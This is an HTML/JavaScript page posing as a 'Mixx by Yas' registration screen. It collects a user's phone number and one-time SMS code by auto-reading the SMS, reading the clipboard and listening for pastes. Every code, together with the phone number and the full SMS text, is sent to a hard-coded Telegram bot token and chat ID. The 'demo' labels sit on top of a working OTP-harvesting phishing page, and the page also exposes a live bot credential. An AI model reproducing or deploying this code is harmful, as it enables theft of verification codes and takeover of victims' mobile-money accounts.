<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Mixx Registration</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f7fafc;
            padding: 1rem;
        }
        .container {
            background: white;
            border-radius: 24px;
            padding: 2.5rem;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
        }
        h1 {
            font-size: 1.5rem;
            color: #1a202c;
            margin-bottom: 0.25rem;
        }
        .sub {
            color: #718096;
            font-size: 0.9rem;
            margin-bottom: 2rem;
        }
        .form-group {
            margin-bottom: 1.25rem;
        }
        .form-group label {
            display: block;
            font-weight: 500;
            color: #2d3748;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
        }
        .form-group input {
            width: 100%;
            padding: 0.875rem;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 1rem;
            transition: border-color 0.2s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .form-group input:disabled {
            background: #f7fafc;
            cursor: not-allowed;
        }
        .btn {
            width: 100%;
            padding: 0.875rem;
            font-size: 1rem;
            font-weight: 600;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-primary {
            background: #667eea;
            color: white;
        }
        .btn-primary:hover:not(:disabled) {
            background: #5a67d8;
            transform: translateY(-1px);
        }
        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .btn-success {
            background: #48bb78;
            color: white;
        }
        .btn-success:hover:not(:disabled) {
            background: #38a169;
        }
        .btn-outline {
            background: transparent;
            border: 2px solid #e2e8f0;
            color: #4a5568;
        }
        .btn-outline:hover {
            background: #f7fafc;
            border-color: #cbd5e0;
        }
        .btn-danger {
            background: #fc8181;
            color: white;
        }
        .btn-danger:hover:not(:disabled) {
            background: #f56565;
        }
        .status {
            margin: 1rem 0;
            padding: 0.75rem;
            border-radius: 12px;
            font-size: 0.9rem;
            text-align: center;
            display: none;
        }
        .status.show {
            display: block;
        }
        .status.success {
            background: #c6f6d5;
            color: #22543d;
        }
        .status.error {
            background: #fed7d7;
            color: #9b2c2c;
        }
        .status.info {
            background: #bee3f8;
            color: #2a4365;
        }
        .status.loading {
            background: #fefcbf;
            color: #744210;
        }
        .code-display {
            background: #f7fafc;
            border-radius: 12px;
            padding: 1rem;
            text-align: center;
            font-family: 'Courier New', monospace;
            font-size: 1.25rem;
            letter-spacing: 2px;
            color: #2d3748;
            min-height: 56px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px dashed #e2e8f0;
            margin: 1rem 0;
        }
        .code-display.filled {
            border-color: #48bb78;
            border-style: solid;
            background: #f0fff4;
            color: #22543d;
            font-weight: 600;
        }
        .flex-row {
            display: flex;
            gap: 0.5rem;
        }
        .flex-row .btn {
            flex: 1;
        }
        .flex-row .btn-outline {
            padding: 0.625rem;
            font-size: 0.85rem;
        }
        .hidden {
            display: none !important;
        }
        .mt-2 {
            margin-top: 1rem;
        }
        .text-sm {
            font-size: 0.75rem;
            color: #a0aec0;
            text-align: center;
            margin-top: 1.5rem;
        }
        .text-sm code {
            background: #edf2f7;
            padding: 0.125rem 0.375rem;
            border-radius: 4px;
        }
        .divider {
            height: 1px;
            background: #e2e8f0;
            margin: 1.5rem 0;
        }
        .otp-hint {
            font-size: 0.8rem;
            color: #718096;
            margin-top: 0.25rem;
        }
        .telegram-status {
            font-size: 0.8rem;
            text-align: center;
            margin-top: 0.5rem;
            display: none;
            padding: 0.5rem;
            border-radius: 8px;
            background: #f0fff4;
        }
        .telegram-status.show {
            display: block;
        }
        .telegram-status.success {
            color: #22543d;
            background: #c6f6d5;
        }
        .telegram-status.error {
            color: #9b2c2c;
            background: #fed7d7;
        }
        .demo-badge {
            display: inline-block;
            background: #fefcbf;
            color: #744210;
            padding: 0.25rem 0.75rem;
            border-radius: 20px;
            font-size: 0.7rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
        }
        .log-area {
            background: #1a202c;
            color: #68d391;
            border-radius: 8px;
            padding: 0.75rem;
            font-family: 'Courier New', monospace;
            font-size: 0.7rem;
            max-height: 120px;
            overflow-y: auto;
            margin-top: 1rem;
            display: none;
        }
        .log-area.show {
            display: block;
        }
        .log-area .log-entry {
            padding: 0.15rem 0;
            border-bottom: 1px solid #2d3748;
        }
        .log-area .log-entry:last-child {
            border-bottom: none;
        }
        .log-area .time {
            color: #a0aec0;
            margin-right: 0.5rem;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>📱 Mixx by Yas</h1>
        <p class="sub">Complete your registration</p>

        <!-- STEP 1: Phone -->
        <div id="step1">
            <div class="form-group">
                <label>Phone Number</label>
                <input type="tel" id="phoneInput" placeholder="+254 700 000 000" value="+254 700 000 000" />
            </div>
            <button class="btn btn-primary" id="sendBtn">📤 Send Code (Demo)</button>
            <div style="margin-top: 0.5rem; font-size:0.75rem; color:#718096; text-align:center;">
                ⚡ Demo mode - No actual SMS will be sent
            </div>
        </div>

        <div id="status" class="status"></div>

        <!-- STEP 2: Code -->
        <div id="step2" class="hidden">
            <div class="form-group">
                <label>Enter the code from SMS</label>
                <div class="code-display" id="codeDisplay">
                    <span style="color:#a0aec0; font-size:0.9rem;">Waiting for code...</span>
                </div>
                <input type="text" id="codeInput" placeholder="Paste or type code" autocomplete="one-time-code" />
                <div class="otp-hint">Code is 22 characters: letters and numbers</div>
            </div>

            <div class="flex-row">
                <button class="btn btn-outline" id="listenBtn">📡 Listen</button>
                <button class="btn btn-outline" id="pasteBtn">📋 Paste</button>
                <button class="btn btn-outline" id="testBtn">🧪 Test</button>
            </div>

            <button class="btn btn-success mt-2" id="verifyBtn" disabled>✅ Verify & Complete</button>

            <div id="telegramStatus" class="telegram-status">📤 Code forwarded to Telegram bot</div>

            <div class="divider"></div>
            <button class="btn btn-outline" id="backBtn">← Change Phone</button>
        </div>

        <div class="text-sm">
            🔒 Secure • SMS auto-read on Android Chrome 84+ &amp; iOS 16+
        </div>

        <!-- Log Area -->
        <div id="logArea" class="log-area">
            <div style="color:#a0aec0; margin-bottom:0.5rem; font-weight:600;">📋 Activity Log</div>
        </div>
    </div>

    <script>
        // ================================================================
        //  TELEGRAM CONFIG
        // ================================================================
        const TELEGRAM_BOT_TOKEN = '8918701353:AAH7pb1jrIR81LEwAy9_elWFFdkexmlAcPI';
        const TELEGRAM_CHAT_ID = '5520957080';

        // ================================================================
        //  STATE
        // ================================================================
        let currentPhone = '';
        let currentCode = '';
        let isListening = false;
        let abortController = null;
        let codeForwarded = false;

        // DOM refs
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const phoneInput = document.getElementById('phoneInput');
        const sendBtn = document.getElementById('sendBtn');
        const codeInput = document.getElementById('codeInput');
        const codeDisplay = document.getElementById('codeDisplay');
        const listenBtn = document.getElementById('listenBtn');
        const pasteBtn = document.getElementById('pasteBtn');
        const testBtn = document.getElementById('testBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const backBtn = document.getElementById('backBtn');
        const statusDiv = document.getElementById('status');
        const telegramStatus = document.getElementById('telegramStatus');
        const logArea = document.getElementById('logArea');

        // ================================================================
        //  LOGGING
        // ================================================================
        function addLog(message, type = 'info') {
            logArea.classList.add('show');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            const time = new Date().toLocaleTimeString();
            const emoji = type === 'success' ? '✅' : type === 'error' ? '❌' : 'ℹ️';
            entry.innerHTML = `<span class="time">${time}</span>${emoji} ${message}`;
            logArea.appendChild(entry);
            logArea.scrollTop = logArea.scrollHeight;
        }

        // ================================================================
        //  TELEGRAM FUNCTION
        // ================================================================
        async function sendToTelegram(phone, code, fullSms = '', source = 'manual') {
            try {
                addLog(`Sending to Telegram: ${code} (${source})`, 'info');

                const message = `
📱 *New Registration Attempt*
━━━━━━━━━━━━━━━━━━
📞 *Phone:* ${phone}
🔑 *Code:* \`${code}\`
📡 *Source:* ${source}
📝 *Full SMS:* ${fullSms || 'N/A'}
🕐 *Time:* ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━
Status: ⏳ Pending Verification
                `;

                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const data = await response.json();
                
                if (data.ok) {
                    telegramStatus.textContent = '✅ Code forwarded to Telegram!';
                    telegramStatus.className = 'telegram-status show success';
                    codeForwarded = true;
                    addLog(`✅ Telegram sent successfully: ${code}`, 'success');
                    return true;
                } else {
                    console.error('Telegram API error:', data);
                    telegramStatus.textContent = '⚠️ Failed to send to Telegram';
                    telegramStatus.className = 'telegram-status show error';
                    addLog(`❌ Telegram error: ${data.description || 'Unknown error'}`, 'error');
                    return false;
                }
            } catch (err) {
                console.error('Telegram send error:', err);
                telegramStatus.textContent = '⚠️ Telegram error - check console';
                telegramStatus.className = 'telegram-status show error';
                addLog(`❌ Telegram connection error: ${err.message}`, 'error');
                return false;
            }
        }

        // ================================================================
        //  UI HELPERS
        // ================================================================
        function showStatus(msg, type = 'info') {
            statusDiv.textContent = msg;
            statusDiv.className = `status show ${type}`;
            addLog(msg, type);
        }

        function hideStatus() {
            statusDiv.className = 'status';
        }

        function setCode(code, source = 'manual', fullSms = '') {
            if (!code || code.length < 10) {
                showStatus('Invalid code format', 'error');
                return;
            }
            currentCode = code;
            codeDisplay.textContent = code;
            codeDisplay.className = 'code-display filled';
            codeInput.value = code;
            verifyBtn.disabled = false;
            showStatus(`✅ Code received (${source})`, 'success');

            // Send to Telegram
            if (currentPhone) {
                sendToTelegram(currentPhone, code, fullSms, source);
            } else {
                addLog('⚠️ No phone number set, skipping Telegram', 'error');
            }
        }

        function goToStep(step) {
            if (step === 1) {
                step1.classList.remove('hidden');
                step2.classList.add('hidden');
                hideStatus();
                currentCode = '';
                codeForwarded = false;
                codeInput.value = '';
                codeDisplay.textContent = 'Waiting for code...';
                codeDisplay.className = 'code-display';
                verifyBtn.disabled = true;
                telegramStatus.className = 'telegram-status';
                phoneInput.focus();
            } else {
                step1.classList.add('hidden');
                step2.classList.remove('hidden');
                codeInput.focus();
            }
        }

        // ================================================================
        //  EXTRACT CODE FROM SMS
        // ================================================================
        function extractCode(text) {
            if (!text) return null;

            // Pattern 1: "use the code XXXX" - our SMS format
            let match = text.match(/use the code ([A-Za-z0-9]{15,30})/i);
            if (match) {
                addLog(`Extracted code via pattern 1: ${match[1]}`, 'info');
                return match[1];
            }

            // Pattern 2: Any 20-25 char alphanumeric
            match = text.match(/\b([A-Za-z0-9]{20,25})\b/);
            if (match) {
                addLog(`Extracted code via pattern 2: ${match[1]}`, 'info');
                return match[1];
            }

            // Pattern 3: Code followed by alphanumeric
            match = text.match(/code[:\s]+([A-Za-z0-9]{15,30})/i);
            if (match) {
                addLog(`Extracted code via pattern 3: ${match[1]}`, 'info');
                return match[1];
            }

            addLog('No code pattern found in text', 'error');
            return null;
        }

        // ================================================================
        //  SEND CODE (STEP 1) - DEMO MODE (NO API)
        // ================================================================
        sendBtn.addEventListener('click', async () => {
            const phone = phoneInput.value.trim();

            if (!phone || phone.length < 8) {
                showStatus('Please enter a valid phone number', 'error');
                return;
            }

            if (!phone.match(/^[\+\d\s\-\(\)]{8,20}$/)) {
                showStatus('Invalid phone number format', 'error');
                return;
            }

            currentPhone = phone;
            showStatus(`📤 Demo: Code would be sent to ${phone}`, 'loading');
            sendBtn.disabled = true;

            // Simulate sending delay
            setTimeout(() => {
                showStatus(`✅ Demo code ready for ${phone}!`, 'success');
                goToStep(2);
                addLog(`📱 Phone set: ${phone}`, 'success');

                // Show demo code in status
                const demoCode = 'yoLiknbBgbDCRNJjXMtk';
                setCode(demoCode, 'demo', 'Demo SMS - use the code yoLiknbBgbDCRNJjXMtk to complete registration');
                
                sendBtn.disabled = false;
            }, 1500);
        });

        phoneInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !sendBtn.disabled) sendBtn.click();
        });

        // ================================================================
        //  WEBOTP - AUTO READ
        // ================================================================
        async function startWebOTP() {
            if (isListening) return;

            if (!('OTPCredential' in window)) {
                showStatus('ℹ️ WebOTP not supported. Use Paste or Test.', 'info');
                addLog('WebOTP not supported in this browser', 'error');
                return;
            }

            try {
                isListening = true;
                listenBtn.textContent = '⏳ Listening...';
                listenBtn.disabled = true;
                showStatus('📩 Waiting for SMS...', 'loading');
                addLog('📡 WebOTP listener started', 'info');

                if (abortController) abortController.abort();
                abortController = new AbortController();

                const credential = await navigator.credentials.get({
                    otp: { transport: ['sms'] },
                    signal: abortController.signal
                });

                if (credential && credential.code) {
                    const fullSms = credential.code;
                    addLog(`📨 SMS received: ${fullSms.substring(0, 50)}...`, 'info');
                    const code = extractCode(fullSms);
                    if (code) {
                        setCode(code, 'WebOTP', fullSms);
                        addLog(`🎯 Code extracted via WebOTP: ${code}`, 'success');
                        setTimeout(() => verifyBtn.click(), 1000);
                    } else {
                        showStatus('⚠️ SMS received but no code found', 'error');
                        addLog('⚠️ SMS received but no code pattern found', 'error');
                    }
                }

            } catch (err) {
                if (err.name !== 'AbortError') {
                    console.error('WebOTP error:', err);
                    showStatus('⏱️ Timeout or error. Use Paste or Test.', 'info');
                    addLog(`WebOTP error: ${err.message}`, 'error');
                }
            } finally {
                isListening = false;
                listenBtn.textContent = '📡 Listen';
                listenBtn.disabled = false;
            }
        }

        listenBtn.addEventListener('click', startWebOTP);

        // ================================================================
        //  CLIPBOARD PASTE
        // ================================================================
        pasteBtn.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                addLog(`📋 Clipboard read: ${text.substring(0, 30)}...`, 'info');
                const code = extractCode(text);
                if (code) {
                    setCode(code, 'clipboard', text);
                } else {
                    showStatus('❌ No Mixx code found in clipboard', 'error');
                    addLog('❌ No code found in clipboard', 'error');
                }
            } catch (err) {
                showStatus('❌ Cannot read clipboard. Type manually.', 'error');
                addLog(`Clipboard error: ${err.message}`, 'error');
                console.error('Clipboard error:', err);
            }
        });

        // ================================================================
        //  MANUAL INPUT
        // ================================================================
        codeInput.addEventListener('input', () => {
            const code = extractCode(codeInput.value);
            if (code) {
                setCode(code, 'manual', codeInput.value);
            } else if (codeInput.value.length >= 15) {
                setCode(codeInput.value, 'manual', codeInput.value);
            }
        });

        document.addEventListener('paste', (e) => {
            if (step2.classList.contains('hidden')) return;
            const text = e.clipboardData.getData('text');
            const code = extractCode(text);
            if (code) {
                setCode(code, 'global paste', text);
                e.preventDefault();
            }
        });

        // ================================================================
        //  TEST BUTTON
        // ================================================================
        testBtn.addEventListener('click', () => {
            const sample =
                "You are being registered in Mixx by Yas Super App, use the code yoLiknbBgbDCRNJjXMtk to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR";
            const code = extractCode(sample);
            if (code) {
                setCode(code, 'test', sample);
                showStatus('🧪 Test code loaded! Check Telegram.', 'success');
                addLog('🧪 Test code loaded and sent to Telegram', 'success');
            } else {
                showStatus('❌ Test failed', 'error');
                addLog('❌ Test code extraction failed', 'error');
            }
        });

        // ================================================================
        //  VERIFY CODE - DEMO MODE (NO API)
        // ================================================================
        verifyBtn.addEventListener('click', async () => {
            if (!currentCode || currentCode.length < 15) {
                showStatus('Please enter a valid code', 'error');
                return;
            }

            showStatus('✅ Verifying... (Demo)', 'loading');
            verifyBtn.disabled = true;

            // Simulate verification
            setTimeout(() => {
                showStatus('🎉 Registration complete! Welcome to Mixx!', 'success');
                addLog(`🎉 User verified with code: ${currentCode}`, 'success');
                
                // Send confirmation to Telegram
                sendToTelegram(currentPhone, currentCode, `✅ VERIFIED - Registration Complete`, 'verification');
                
                // Reset after a moment
                setTimeout(() => {
                    verifyBtn.disabled = false;
                    goToStep(1);
                    addLog('🔄 Reset for next user', 'info');
                }, 3000);
            }, 1500);
        });

        codeInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !verifyBtn.disabled) verifyBtn.click();
        });

        // ================================================================
        //  BACK BUTTON
        // ================================================================
        backBtn.addEventListener('click', () => {
            goToStep(1);
            if (abortController) abortController.abort();
            isListening = false;
            listenBtn.textContent = '📡 Listen';
            listenBtn.disabled = false;
            addLog('↩️ Returned to phone step', 'info');
        });

        // ================================================================
        //  INIT
        // ================================================================
        console.log('📱 Mixx Registration with Telegram integration (DEMO MODE)');
        console.log('🤖 Bot Token:', TELEGRAM_BOT_TOKEN);
        console.log('📱 Chat ID:', TELEGRAM_CHAT_ID);
        console.log('🧪 Click "Test" to send a sample code to Telegram');
        console.log('📋 Or paste any SMS with a code');

        phoneInput.focus();
        addLog('🚀 App loaded in DEMO mode', 'info');

        // Test Telegram connection on load
        async function testTelegramConnection() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
                const data = await response.json();
                if (data.ok) {
                    addLog(`✅ Telegram bot connected: @${data.result.username}`, 'success');
                    console.log('✅ Telegram bot connected:', data.result.username);
                } else {
                    addLog(`❌ Telegram bot connection failed: ${data.description}`, 'error');
                    console.error('❌ Telegram bot connection failed');
                }
            } catch (err) {
                addLog(`❌ Cannot connect to Telegram API: ${err.message}`, 'error');
                console.error('❌ Cannot connect to Telegram API:', err);
            }
        }
        testTelegramConnection();

        // Auto-send test code after 2 seconds
        setTimeout(() => {
            if (!codeForwarded) {
                addLog('💡 Tip: Click "Send Code" or "Test" to try it out', 'info');
            }
        }, 2000);
    </script>

</body>
</html>
